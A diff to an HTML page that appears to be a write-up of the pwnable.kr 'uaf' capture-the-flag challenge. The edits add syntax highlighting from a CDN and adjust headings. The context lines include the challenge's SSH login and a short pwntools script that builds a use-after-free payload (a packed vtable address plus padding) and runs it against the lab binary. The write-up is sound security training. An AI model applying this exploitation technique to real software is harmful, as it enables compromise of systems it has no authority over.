@@ -6,6 +6,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
 
+    <!-- syntax highlighting (only affects code blocks we mark with language-*) -->
+    <link rel="stylesheet"
+          href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script defer>
+        window.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll("pre code.language-c, pre code.language-python, pre code.language-bash")
+                .forEach((el) => window.hljs && hljs.highlightElement(el));
+        });
+    </script>
+
     <style>
         :root {
             --bg: #f7f5ff;
@@ -175,12 +186,12 @@
         <article>
             <hr />
 
-            <h2>Hint</h2>
+            <p>We get the following hint:</p>
             <pre><code>Do you wanna try some Use-After-Free vulnerability exploitation?
 
 ssh uaf@pwnable.kr -p2222 (pw:guest)</code></pre>
 
-            <h2>Setup</h2>
+            <p>First, let's connect:</p>
             <pre><code>ssh uaf@pwnable.kr -p2222</code></pre>
 
             <p>In <code>/home/uaf</code> we see:</p>
@@ -318,7 +329,7 @@ I am a cute girl!</code></pre>
             </ol>
 
             <p>This is the script:</p>
-            <pre><code>from pwn import *
+            <pre><code class="language-python">from pwn import *
 
 address = p64(0x404d78)
 payload = address + (b'A' * (48-len(address)))
@@ -330,7 +341,7 @@ with open('input', 'wb') as f:
             <pre><code>b'xM@\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</code></pre>
 
             <p>And then:</p>
-            <pre><code>$ ~/uaf 48 input
+            <pre><code class="language-bash">$ ~/uaf 48 input
 1. use
 2. after
 3. free
